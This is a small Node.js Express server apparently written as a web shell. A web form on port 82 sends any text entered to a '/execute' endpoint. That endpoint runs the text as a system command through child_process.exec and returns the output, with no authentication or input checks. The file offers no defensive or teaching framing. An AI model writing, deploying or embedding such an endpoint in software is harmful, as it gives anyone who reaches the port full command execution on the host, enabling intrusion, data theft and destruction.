const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');

const app = express();
const port = 82;

// Body parser middleware
app.use(bodyParser.urlencoded({ extended: true }));

// HTML Form
app.get('/', (req, res) => {
    res.send(`
        <html>
            <body>
                <form action="/execute" method="post">
                    <input type="text" name="command" placeholder="Enter command">
                    <button type="submit">Send</button>
                </form>
            </body>
        </html>
    `);
});

// Command execution endpoint
app.post('/execute', (req, res) => {
    const command = req.body.command;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.send(`Error: ${error.message}`);
        }
        if (stderr) {
            return res.send(`Stderr: ${stderr}`);
        }
        res.send(`Output: ${stdout}`);
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
